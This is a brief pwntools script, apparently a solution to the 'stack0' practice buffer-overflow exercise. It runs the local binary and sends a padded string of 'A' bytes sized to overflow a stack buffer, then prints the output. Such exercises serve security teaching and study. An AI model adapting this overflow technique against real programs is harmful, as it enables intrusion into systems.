from pwn import *

p = process('./stack0')

payload = b'A' * (0x50 - 0x4 + 1)

p.sendline(payload)

data = p.recv(1024)

print(data.decode('utf-8'))